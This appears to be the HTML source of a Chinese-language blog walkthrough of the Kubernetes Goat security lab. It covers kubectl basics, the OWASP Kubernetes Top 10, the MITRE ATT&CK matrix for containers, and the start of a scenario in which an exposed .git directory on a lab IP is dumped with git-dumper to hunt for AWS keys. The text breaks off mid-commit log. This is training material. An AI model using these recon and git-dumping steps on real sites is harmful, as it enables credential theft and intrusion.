@@ -1,0 +1,2064 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      K8S靶场-Kubernetes Goat | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「K8S靶场-Kubernetes Goat」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" itemprop="url">
+		K8S靶场-Kubernetes Goat
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/" itemprop="url">
+		<time datetime="2024-08-29T14:33:07.000Z" itemprop="dateUpdated">
+	  		2024-08-29
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" class=" ">
+			云原生
+		</a>
+	
+		<a href="/tags/Kubernetes/" class=" ">
+			Kubernetes
+		</a>
+	
+		<a href="/tags/K8S/" class=" ">
+			K8S
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="0-先验知识"><a href="#0-先验知识" class="headerlink" title="0 先验知识"></a>0 先验知识</h1><p><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/kubernetes-goat-architecture">https://madhuakula.com/kubernetes-goat/docs/kubernetes-goat-architecture</a></p>
+<h2 id="0-1-K8S-Goat架构"><a href="#0-1-K8S-Goat架构" class="headerlink" title="0.1 K8S Goat架构"></a>0.1 K8S Goat架构</h2><p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/kubernetes-goat-architecture-4099d7971708fd3eca36d17133b5a6ee.png" alt="kubernetes-goat-architecture-4099d7971708fd3eca36d17133b5a6ee"></p>
+<h2 id="0-2-K8S介绍"><a href="#0-2-K8S介绍" class="headerlink" title="0.2 K8S介绍"></a>0.2 K8S介绍</h2><p>每个K8S集群至少有一个工作节点（worker node）</p>
+<p>高层次下的组件介绍：</p>
+<ul>
+<li><p><strong>Control Plane Components</strong></p>
+<ul>
+<li><p>API Server</p>
+</li>
+<li><p>etcd</p>
+</li>
+<li><p>Scheduler</p>
+</li>
+<li><p>Controller Manager</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Node Components</strong></p>
+<ul>
+<li>kubelet</li>
+<li>Network Proxy（kube-proxy）</li>
+<li>Container runtime</li>
+</ul>
+</li>
+<li><p><strong>Add-Ons</strong></p>
+<ul>
+<li>DNS</li>
+<li>Container Resource Monitoring</li>
+<li>Cluster-level Logging</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/kubernetes-architecture-f3bb4e3aca92440b40ece44c3b95d620.png" alt="kubernetes-architecture-f3bb4e3aca92440b40ece44c3b95d620"></p>
+<blockquote>
+<p>K8S的官方简要教程：<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/tutorials/kubernetes-basics/">https://kubernetes.io/docs/tutorials/kubernetes-basics/</a></p>
+</blockquote>
+<h2 id="0-3-命令备忘录"><a href="#0-3-命令备忘录" class="headerlink" title="0.3 命令备忘录"></a>0.3 命令备忘录</h2><h3 id="0-3-1-Docker"><a href="#0-3-1-Docker" class="headerlink" title="0.3.1 Docker"></a>0.3.1 Docker</h3><p>获取docker版本：<code>docker version</code></p>
+<p>列出所有正在运行的docker容器（列出所有容器则加<code>-a</code>）：<code>docker ps</code></p>
+<p>列出所有可用的docker镜像：<code>docker images</code></p>
+<p>运行一个简单的alpine容器并进入到交互终端：<code>docker run -it alpine sh</code></p>
+<p>查看容器、系统、镜像以及其他信息（示例输出如下）：<code>docker info</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Client:</span><br><span class="line"> Version:    26.0.2</span><br><span class="line"> Context:    default</span><br><span class="line"> Debug Mode: false</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line"> Containers: 54</span><br><span class="line">  Running: 39</span><br><span class="line">  Paused: 0</span><br><span class="line">  Stopped: 15</span><br><span class="line"> Images: 20</span><br><span class="line"> Server Version: 26.0.2</span><br><span class="line"> Storage Driver: overlay2</span><br><span class="line">  Backing Filesystem: extfs</span><br><span class="line">  Supports d_type: true</span><br><span class="line">  Using metacopy: false</span><br><span class="line">  Native Overlay Diff: true</span><br><span class="line">  userxattr: false</span><br><span class="line"> Logging Driver: json-file</span><br><span class="line"> Cgroup Driver: cgroupfs</span><br><span class="line"> Cgroup Version: 2</span><br><span class="line"> Plugins:</span><br><span class="line">  Volume: local</span><br><span class="line">  Network: bridge host ipvlan macvlan null overlay</span><br><span class="line">  Log: awslogs fluentd gcplogs gelf journald json-file local splunk syslog</span><br><span class="line"> Swarm: inactive</span><br><span class="line"> Runtimes: io.containerd.runc.v2 runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> Init Binary: docker-init</span><br><span class="line"> containerd version: 926c9586fe4a6236699318391cd44976a98e31f1</span><br><span class="line"> runc version: 51d5e94601ceffbbd85688df1c928ecccbfa4685</span><br><span class="line"> init version: de40ad0</span><br><span class="line"> Security Options:</span><br><span class="line">  seccomp</span><br><span class="line">   Profile: builtin</span><br><span class="line">  cgroupns</span><br><span class="line"> Kernel Version: 5.10.207</span><br><span class="line"> Operating System: Buildroot 2023.02.9</span><br><span class="line"> OSType: linux</span><br><span class="line"> Architecture: x86_64</span><br><span class="line"> CPUs: 2</span><br><span class="line"> Total Memory: 3.636GiB</span><br><span class="line"> Name: minikube</span><br><span class="line"> ID: 06057cf4-2939-4cd2-a255-fd9e94ff579a</span><br><span class="line"> Docker Root Dir: /var/lib/docker</span><br><span class="line"> Debug Mode: false</span><br><span class="line"> Labels:</span><br><span class="line">  provider=kvm2</span><br><span class="line"> Experimental: false</span><br><span class="line"> Insecure Registries:</span><br><span class="line">  10.96.0.0/12</span><br><span class="line">  127.0.0.0/8</span><br><span class="line"> Live Restore Enabled: false</span><br><span class="line"> Product License: Community Engine</span><br></pre></td></tr></table></figure>
+
+<p>进入一个正在运行的容器的交互终端：<code>docker exec -it &lt;容器名&gt; sh</code></p>
+<p>检视一个容器：<code>docker inspect &lt;容器名&gt;</code></p>
+<p>检视一个镜像：<code>docker inspect &lt;镜像名&gt;</code></p>
+<p>在docker hub所有可用的镜像中搜索某个镜像：<code>docker search nginx</code></p>
+<h3 id="0-3-2-Kubernetes"><a href="#0-3-2-Kubernetes" class="headerlink" title="0.3.2 Kubernetes"></a>0.3.2 Kubernetes</h3><p>获取K8S版本：<code>kubectl version</code></p>
+<p>获取K8S集群信息：<code>kubectl cluster-info</code></p>
+<p>获取节点信息：<code>kubectl get nodes</code></p>
+<p>在当前命名空间中获取pods信息：<code>kubectl get pods</code></p>
+<p>其他相关资源的获取信息的命令（pods、svc、ns等称为<code>资源</code>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kubectl get po			<span class="comment"># 获取pods</span></span><br><span class="line">kubectl get svc			<span class="comment"># 获取服务</span></span><br><span class="line">kubectl get ing			<span class="comment"># ？</span></span><br><span class="line">kubectl get ns			<span class="comment"># 获取命名空间</span></span><br><span class="line">kubectl get deploy		<span class="comment"># 获取部署</span></span><br><span class="line">kubectl get secrets		<span class="comment"># 获取secrets</span></span><br></pre></td></tr></table></figure>
+
+<p>获取更多相关资源的信息（追加获取IP、所在节点等）：<code>kubectl get pods -o wide</code></p>
+<p>获取相关资源的描述性信息：<code>kubectl describe pod &lt;PODNAME&gt;</code></p>
+<p>进入到一个pod容器的交互性shell：<code>kubectl exec -it &lt;PODNAME&gt; sh</code></p>
+<p>创建一个简单的deployment：<code>kubectl run nginxdeployment --image=nginx</code></p>
+<p>将一个pod的端口转发到本地：<code>kubectl port-forward &lt;PODNAME&gt; 1234:80</code></p>
+<p>获取pod&#x2F;容器的日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl logs &lt;PODNAME&gt;</span><br><span class="line">kubectl logs -f &lt;PODNAME&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从集群中删除某个pod：<code>kubectl delete pod &lt;PODNAME&gt;</code></p>
+<p>从指定命名空间中获取相关资源：<code>kubectl get pods -n abc</code></p>
+<p>获取所有可用的API资源：<code>kubectl api-resources</code></p>
+<p>模拟用户去验证是否具有某项权限：<code>kubectl auth can-i create pods</code></p>
+<p>以YAML格式获取相关资源的信息输出：<code>kubectl get pod &lt;POD NAME&gt; -o yaml</code></p>
+<p>在一条命令中获取多个命令的输出：<code>kubectl get nodes,pods,svc</code></p>
+<h2 id="0-4-OWASP-Kubernetes-Top-10"><a href="#0-4-OWASP-Kubernetes-Top-10" class="headerlink" title="0.4 OWASP Kubernetes Top 10"></a>0.4 OWASP Kubernetes Top 10</h2><p><a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/">https://owasp.org/www-project-kubernetes-top-ten/</a></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240807202846212.png" alt="image-20240807202846212"></p>
+<h3 id="0-4-1-K01-Insecure-Workload-Configurations"><a href="#0-4-1-K01-Insecure-Workload-Configurations" class="headerlink" title="0.4.1 K01 - Insecure Workload Configurations"></a>0.4.1 K01 - Insecure Workload Configurations</h3><p>不安全的工作载荷配置</p>
+<p>关键的配置因素：</p>
+<ul>
+<li>应用程序进程不应以root身份运行</li>
+<li>应该使用只读的文件系统</li>
+<li>应该禁止使用特权容器</li>
+</ul>
+<h3 id="0-4-2-K02-Supply-Chain-Vulnerabilities"><a href="#0-4-2-K02-Supply-Chain-Vulnerabilities" class="headerlink" title="0.4.2 K02 - Supply Chain Vulnerabilities"></a>0.4.2 K02 - Supply Chain Vulnerabilities</h3><p>供应链漏洞</p>
+<p>主要包括：</p>
+<ul>
+<li>镜像完整性：确保容器镜像不受未经授权或恶意修改</li>
+<li>镜像组成：识别和验证容器镜像中包含的所有组件和依赖关系</li>
+<li>已知软件漏洞：减轻在容器镜像中使用的软件组件中发现的漏洞带来的风险</li>
+</ul>
+<h3 id="0-4-3-K03-Overly-Permissive-RBAC"><a href="#0-4-3-K03-Overly-Permissive-RBAC" class="headerlink" title="0.4.3 K03 - Overly Permissive RBAC"></a>0.4.3 K03 - Overly Permissive RBAC</h3><p>RBAC权限过大</p>
+<p>基于角色的访问控制（RBAC）是Kubernetes中的主要授权机制，为资源提供权限。RBAC权限将动词（get、create、delete等）与Pod、服务和节点等资源组合在一起。这些权限可以是命名空间或集群范围的。</p>
+<h3 id="0-4-4-K04-Lack-of-Centralized-Policy-Enforcement"><a href="#0-4-4-K04-Lack-of-Centralized-Policy-Enforcement" class="headerlink" title="0.4.4 K04 - Lack of Centralized Policy Enforcement"></a>0.4.4 K04 - Lack of Centralized Policy Enforcement</h3><p>缺少集中的策略执行</p>
+<p>跨多个Kubernetes集群和环境管理安全策略可能具有挑战性。如果没有一个集中的位置来检测、纠正和防止配置错误，集群可能会受到损害。为了确保一致的安全态势，策略执行应在软件交付生命周期的各个阶段进行。</p>
+<p>这包括在构建阶段应用策略以确保容器映像满足安全要求，在部署期间应用策略以验证应用程序的所需状态是否符合安全策略，以及在运行时持续应用策略以保持合规性。通过在这些阶段实施策略执行，组织可以确保Kubernetes工作负载在所有集群和环境中都是安全和合规的。这种方法提供了一种在整个多集群&#x2F;多云基础架构中应用治理、合规性和安全要求的方法，而不会使安全团队不堪重负，变得难以管理。</p>
+<h3 id="0-4-5-K05-Inadequate-Logging-and-Monitoring"><a href="#0-4-5-K05-Inadequate-Logging-and-Monitoring" class="headerlink" title="0.4.5 K05 - Inadequate Logging and Monitoring"></a>0.4.5 K05 - Inadequate Logging and Monitoring</h3><p>日志与监控不足</p>
+<p>Kubernetes环境能够从所有相关组件创建不同级别的日志。当日志未被监控以检测异常事件（如身份验证尝试失败、访问敏感资源、手动删除或修改Kubernetes资源等）、未设置警报阈值、日志未集中存储或日志基础设施被禁用时，就会出现问题。</p>
+<h3 id="0-4-6-K06-Broken-Authentication-Mechanisms"><a href="#0-4-6-K06-Broken-Authentication-Mechanisms" class="headerlink" title="0.4.6 K06 - Broken Authentication Mechanisms"></a>0.4.6 K06 - Broken Authentication Mechanisms</h3><p>认证机制缺陷</p>
+<p>为了访问Kubernetes API，几个实体需要身份验证。Kubernetes API的身份验证过程是通过HTTP请求完成的，并且可能因集群而异。如果请求无法通过身份验证，则会被拒绝，HTTP状态为401。</p>
+<h3 id="0-4-7-K07-Missing-Network-Segmentation-Controls"><a href="#0-4-7-K07-Missing-Network-Segmentation-Controls" class="headerlink" title="0.4.7 K07 - Missing Network Segmentation Controls"></a>0.4.7 K07 - Missing Network Segmentation Controls</h3><p>缺少网络分段控制</p>
+<p>Kubernetes网络流量控制是管理多个微服务和租户时的一个主要问题。扁平的网络结构允许工作负载无限制地通信，攻击者可以利用这一点来探测和遍历内部网络或调用私有API。</p>
+<h3 id="0-4-8-K08-Secrets-Management-Failures"><a href="#0-4-8-K08-Secrets-Management-Failures" class="headerlink" title="0.4.8 K08 - Secrets Management Failures"></a>0.4.8 K08 - Secrets Management Failures</h3><p>Secrets管理缺陷</p>
+<p>Kubernetes  secrets用于存储小对象，并且与任何其他Kubernetes对象一样创建。这些秘密在<code>.yaml</code> manifest中定义，该清单对用户名和密码等敏感数据进行编码。然而，默认情况下，这些值是编码的，不加密，很容易解码，因此将秘密检查到版本控制或其他系统中是有风险的。</p>
+<h3 id="0-4-9-K09-Misconfigured-Cluster-Components"><a href="#0-4-9-K09-Misconfigured-Cluster-Components" class="headerlink" title="0.4.9 K09 - Misconfigured Cluster Components"></a>0.4.9 K09 - Misconfigured Cluster Components</h3><p>集群组件配置错误</p>
+<p>Kubernetes关键组件的配置错误可能会导致整个集群的沦陷或更糟。Kubernetes控制平面和节点由各种容易被错误配置的组件组成，如kubelet、etcd、kube-apiserver等。</p>
+<h3 id="0-4-10-K10-Outdated-and-Vulnerable-Kubernetes-Components"><a href="#0-4-10-K10-Outdated-and-Vulnerable-Kubernetes-Components" class="headerlink" title="0.4.10 K10 - Outdated and Vulnerable Kubernetes Components"></a>0.4.10 K10 - Outdated and Vulnerable Kubernetes Components</h3><p>过时与有漏洞的K8S组件</p>
+<p>当涉及到传统的补丁和漏洞管理时，Kubernetes集群可能会带来挑战。ArgoCD、Kubernetes本身和Istio等流行工具的配置错误导致了严重的CVE。</p>
+<h2 id="0-5-MITRE-ATT-CK"><a href="#0-5-MITRE-ATT-CK" class="headerlink" title="0.5 MITRE ATT&amp;CK"></a>0.5 MITRE ATT&amp;CK</h2><table>
+<thead>
+<tr>
+<th><strong>Initial Access</strong></th>
+<th><strong>Execution</strong></th>
+<th><strong>Persistence</strong></th>
+<th><strong>Privilege Escalation</strong></th>
+<th><strong>Defense Evasion</strong></th>
+<th><strong>Credential Access</strong></th>
+<th><strong>Discovery</strong></th>
+<th><strong>Lateral Movement</strong></th>
+<th><strong>Collection</strong></th>
+<th><strong>Impact</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Using Cloud credentials</td>
+<td>Exec into container</td>
+<td>Backdoor container</td>
+<td>Privileged container</td>
+<td>Clear container logs</td>
+<td>List K8S secrets</td>
+<td>Access the K8S API server</td>
+<td>Access cloud resources</td>
+<td>Images from a private registry</td>
+<td>Data Destruction</td>
+</tr>
+<tr>
+<td>Compromised images in registry</td>
+<td>bash&#x2F;cmd inside container</td>
+<td>Writable hostPath mount</td>
+<td>Cluster-admin binding</td>
+<td>Delete K8S events</td>
+<td>Mount service principal</td>
+<td>Access Kubelet API</td>
+<td>Container service account</td>
+<td></td>
+<td>Resource Hijacking</td>
+</tr>
+<tr>
+<td>Kubeconfig file</td>
+<td>New container</td>
+<td>Kubernetes CronJob</td>
+<td>hostPath mount</td>
+<td>Pod &#x2F; container name similarity</td>
+<td>Access container service account</td>
+<td>Network mapping</td>
+<td>Cluster internal networking</td>
+<td></td>
+<td>Denial of service</td>
+</tr>
+<tr>
+<td>Application vulnerability</td>
+<td>Application exploit (RCE)</td>
+<td>Malicious admission controller</td>
+<td>Access cloud resources</td>
+<td>Connect from Proxy server</td>
+<td>Applications credentials in configuration files</td>
+<td>Access Kubernetes dashboard</td>
+<td>Applications credentials in configuration files</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Exposed Dashboard</td>
+<td>SSH server running inside container</td>
+<td></td>
+<td></td>
+<td></td>
+<td>Access managed identity credential</td>
+<td>Instance Metadata API</td>
+<td>Writable volume mounts on the host</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Exposed sensitive interfaces</td>
+<td>Sidecar injection</td>
+<td></td>
+<td></td>
+<td></td>
+<td>Malicious admission controller</td>
+<td></td>
+<td>Access Kubernetes dashboard</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>Access tiller endpoint</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>CoreDNS poisoning</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>ARP poisoning and IP spoofing</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="0-5-1-Initial-Access"><a href="#0-5-1-Initial-Access" class="headerlink" title="0.5.1 Initial Access"></a>0.5.1 Initial Access</h3><p>包括用于访问资源的技术。在容器化环境中，这些技术允许首先访问集群。这种访问可以直接通过集群管理层实现，或者通过访问部署在集群上的恶意或易受攻击的资源来实现。</p>
+<h3 id="0-5-2-Execution"><a href="#0-5-2-Execution" class="headerlink" title="0.5.2 Execution"></a>0.5.2 Execution</h3><p>包括攻击者用来在集群内运行代码的技术。</p>
+<h3 id="0-5-3-Persistence"><a href="#0-5-3-Persistence" class="headerlink" title="0.5.3 Persistence"></a>0.5.3 Persistence</h3><p>包括攻击者在失去初始立足点时用来保持对集群访问的技术。</p>
+<h3 id="0-5-4-Privilege-Escalation"><a href="#0-5-4-Privilege-Escalation" class="headerlink" title="0.5.4 Privilege Escalation"></a>0.5.4 Privilege Escalation</h3><p>包括攻击者用来在环境中获得比目前更高的特权的技术。在容器化环境中，这可能包括从容器访问节点、在集群中获得更高的权限，甚至访问云资源。</p>
+<h3 id="0-5-5-Defense-Evasion"><a href="#0-5-5-Defense-Evasion" class="headerlink" title="0.5.5 Defense Evasion"></a>0.5.5 Defense Evasion</h3><p>包括攻击者用来避免被发现和隐藏其活动的技术。</p>
+<h3 id="0-5-6-Credential-Access"><a href="#0-5-6-Credential-Access" class="headerlink" title="0.5.6 Credential Access"></a>0.5.6 Credential Access</h3><p>包括攻击者用来窃取凭证的技术。在容器化环境中，这包括正在运行的应用程序的凭据、身份、存储在集群中的secrets或云凭据。</p>
+<h3 id="0-5-7-Discovery"><a href="#0-5-7-Discovery" class="headerlink" title="0.5.7 Discovery"></a>0.5.7 Discovery</h3><p>包括攻击者用来探索他们访问的环境的技术。这种探索有助于攻击者进行横向移动并获得额外的资源。</p>
+<h3 id="0-5-8-Lateral-Movement"><a href="#0-5-8-Lateral-Movement" class="headerlink" title="0.5.8 Lateral Movement"></a>0.5.8 Lateral Movement</h3><p>包括攻击者在受害者环境中移动的技术。在容器化环境中，这包括从一个容器的给定访问权限访问集群中的各种资源，从容器访问底层节点，或访问云环境。</p>
+<h3 id="0-5-9-Collection"><a href="#0-5-9-Collection" class="headerlink" title="0.5.9 Collection"></a>0.5.9 Collection</h3><p>包括攻击者用来从集群或通过使用集群收集数据的技术。</p>
+<h3 id="0-5-10-Impact"><a href="#0-5-10-Impact" class="headerlink" title="0.5.10 Impact"></a>0.5.10 Impact</h3><p>包括攻击者用来破坏、滥用或扰乱环境正常行为的技术。</p>
+<h1 id="1-Sensitive-keys-in-codebases"><a href="#1-Sensitive-keys-in-codebases" class="headerlink" title="1 Sensitive keys in codebases"></a>1 Sensitive keys in codebases</h1><h2 id="1-1-Overview"><a href="#1-1-Overview" class="headerlink" title="1.1 Overview"></a>1.1 Overview</h2><p>此场景旨在关注开发人员和DevOps团队在打包工件和应用程序代码库时出现的一些常见错误。</p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/scenario-1-a9eae5ef2d147efb1ddd430132ef3498.png" alt="scenario-1-a9eae5ef2d147efb1ddd430132ef3498"></p>
+<p><strong>学习内容</strong></p>
+<ul>
+<li>如何测试web应用程序入口点中的安全配置错误</li>
+<li>打包应用和容器的常见错误或配置错误</li>
+<li>检测版本控制系统代码库（git、）中的敏感密钥和信息</li>
+<li>使用开源工具识别和检测敏感信息</li>
+</ul>
+<p><strong>背景</strong></p>
+<p>开发人员倾向于将敏感信息提交到版本控制系统。当我们转向CI&#x2F;CD和GitOps系统时，我们往往忘记在代码和提交中识别敏感信息。</p>
+<p><strong>目标</strong></p>
+<p>识别代码库中可用的敏感密钥。其中包括应用程序代码、容器和基础架构。</p>
+<ul>
+<li>取得AWS的<code>aws_access_key_id</code>、<code>aws_secret_access_key </code></li>
+<li>取得<code>k8s-goat-FLAG</code> Flag</li>
+</ul>
+<h2 id="1-2-Solution-Walkthrough"><a href="#1-2-Solution-Walkthrough" class="headerlink" title="1.2 Solution &amp; Walkthrough"></a>1.2 Solution &amp; Walkthrough</h2><h3 id="1-2-1-Method-1（外部访问，黑盒）"><a href="#1-2-1-Method-1（外部访问，黑盒）" class="headerlink" title="1.2.1 Method 1（外部访问，黑盒）"></a>1.2.1 Method 1（外部访问，黑盒）</h3><p>从目标页面可以得知，用的是Git</p>
+<blockquote>
+<p>Welcome to the build code service. This service is built using  containers with CI&#x2F;CD pipleines and modern toolset like Git, Docker, AWS, and many other.         </p>
+</blockquote>
+<p>因此可以尝试用Gobuster或者DirBuster等目录爆破工具查找有没有特定的备份目录</p>
+<p>kali自带了DirBuster，运行之后是一个GUI界面，自带的字典路径是：<code>/usr/share/dirbuster/wordlists/</code></p>
+<p><img src="/2024/08/29/K8S%E9%9D%B6%E5%9C%BA-Kubernetes-Goat/image-20240807221035789.png" alt="image-20240807221035789"></p>
+<p>知道常见的代码库路径或者一通乱爆，可以找到这个路径：<a target="_blank" rel="noopener" href="http://10.10.10.142:1230/.git/config">http://10.10.10.142:1230/.git/config</a></p>
+<p>返回200意味着存在可用的git配置，有git备份拖库的可能</p>
+<p>可用这个工具进行拖库</p>
+<p>git-dumper安装：</p>
+<ul>
+<li><code>git clone https://github.com/arthaud/git-dumper.git</code></li>
+<li><code>cd git-dumper</code></li>
+<li><code>pip install -r requirements.txt</code></li>
+</ul>
+<p>安装完毕后，执行：<code>python3 git_dumper.py http://10.10.10.142:1230/.git k8s-goat-git</code></p>
+<p>然后就把git的代码库拖到了本地，<code>cd</code>进去</p>
+<p>查看git日志以及之前的提交记录：<code>git log</code></p>
+<p>可以发现有一个提交的备注是“Inlcuded custom environmental variables”，包含了环境变量，可能存在敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">commit 905dcec070d86ce60822d790492d7237884df60a (HEAD -&gt; master)</span><br><span class="line">Author: Madhu Akula 